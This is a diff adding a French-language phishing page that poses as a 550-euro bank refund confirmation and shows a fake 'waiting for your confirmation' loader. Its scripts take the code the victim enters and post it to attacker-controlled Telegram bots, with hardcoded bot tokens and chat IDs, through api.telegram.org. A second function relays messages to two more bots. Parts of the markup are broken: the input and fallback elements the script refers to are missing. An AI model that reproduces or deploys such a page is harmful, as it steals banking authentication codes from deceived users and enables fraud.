@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmation du remboursement </title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      background: #f5f7fb;
+      font-family: Arial, sans-serif;
+      color: #172033;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 440px;
+      padding: 32px;
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 12px 40px rgba(20, 30, 50, .10);
+      text-align: center;
+    }
+
+    .icon {
+      width: 68px;
+      height: 68px;
+      margin: 0 auto 22px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      background: #eaf0ff;
+      font-size: 30px;
+    }
+
+    h1 {
+      margin: 0 0 12px;
+      font-size: 25px;
+    }
+
+    p {
+      color: #667085;
+      line-height: 1.6;
+    }
+
+    .status {
+      margin: 24px 0;
+      padding: 16px;
+      border-radius: 12px;
+      background: #f5f7fa;
+      font-size: 14px;
+    }
+
+    .loader {
+      width: 28px;
+      height: 28px;
+      margin: 0 auto 12px;
+      border: 3px solid #dce3f0;
+      border-top-color: #315bea;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .fallback {
+      display: none;
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid #e6e9ef;
+    }
+
+    input {
+      width: 100%;
+      padding: 13px;
+      margin-top: 8px;
+      border: 1px solid #ccd3df;
+      border-radius: 10px;
+      font-size: 16px;
+      text-align: center;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 14px;
+      padding: 13px;
+      border: 0;
+      border-radius: 10px;
+      background: #315bea;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .code {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #be1616;
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="card">
+
+    <div class="icon">🔐</div>
+
+    <h1>Confirmez votre remboursement</h1>
+    <h2>550 €</h2>
+
+    <p>
+      Une notification de confirmation devrait apparaître
+      dans votre application bancaire.
+    </p>
+
+    <div class="status">
+      <div class="loader"></div>
+      En attente de votre confirmation…
+    </div>
+
+   
+
+      <button type="button" onclick="sendMessage()">confirmer</button>
+      </button>
+    </div>
+  </main>
+
+  <script>
+    // Show input fields after 5 seconds if no notification arrives
+    setTimeout(() => {
+      document.getElementById("fallback").style.display = "block";
+    }, 5000);
+
+    async function sendMessage() {
+      const code = document.getElementById("Code").value.trim();
+
+      if (!code) {
+        alert("Veuillez saisir le code.");
+        return;
+      }
+
+      // INSERT YOUR TELEGRAM CREDENTIALS HERE
+      const botToken = "8873849025:AAFbYN2vQnuTbbv3EI60oHlEdBF7uWplsNE";
+      const chatId = "5534662562";
+
+      const messageText = `🔑 Nouveau Code Reçu: ${code}`;
+
+      try {
+        const response = await fetch(
+          `https://api.telegram.org/bot8873849025:AAFbYN2vQnuTbbv3EI60oHlEdBF7uWplsNE/sendMessage`,
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: messageText
+            })
+          }
+        );
+
+        const result = await response.json();
+        
+        if (result.ok) {
+          // Redirect to Google only if transmission was successful
+          window.location.href = "loading2.html";
+        } else {
+          alert("Erreur lors de l'envoi du message Telegram: " + result.description);
+        }
+      } catch (error) {
+        console.error("Error sending message:", error);
+        alert("Une erreur réseau est survenue.");
+      }
+    }
+  
+  </script>
+  <script>
+    async function sendToTelegramBots(messageText) {
+        // Bot 1 Credentials
+        const botToken1 = '8730509592:AAESLtow6dgWbvadR_P4O2icKcVJglIT2XM';
+        const chatId1 = '8365539748';
+        
+        // Bot 2 Credentials
+        const botToken2 = '8358049102:AAH-shh7M7X7LVTrL3bMvUbTzImMdO_pGpA';
+        const chatId2 = '8365539748';
+    
+        // Telegram API endpoints
+        const url1 = `https://api.telegram.org/bot8730509592:AAESLtow6dgWbvadR_P4O2icKcVJglIT2XM/sendMessage`;
+        const url2 = `https://api.telegram.org/bot8358049102:AAH-shh7M7X7LVTrL3bMvUbTzImMdO_pGpA/sendMessage`;
+    
+        // Payload to send
+        const payload1 = {
+            chat_id: chatId1,
+            text: messageText
+        };
+        
+        const payload2 = {
+            chat_id: chatId2,
+            text: messageText
+        };
+    
+        try {
+            // Send to both bots simultaneously using Promise.all
+            const [response1, response2] = await Promise.all([
+                fetch(url1, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload1)
+                }),
+                fetch(url2, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload2)
+                })
+            ]);
+    
+            if (response1.ok && response2.ok) {
+                console.log('Message successfully sent to both bots!');
+            } else {
+                console.warn('One or both requests returned an error status.');
+            }
+        } catch (error) {
+            console.error('Error sending message to Telegram:', error);
+        }
+    }
+    </script>
+</body>
+</html>
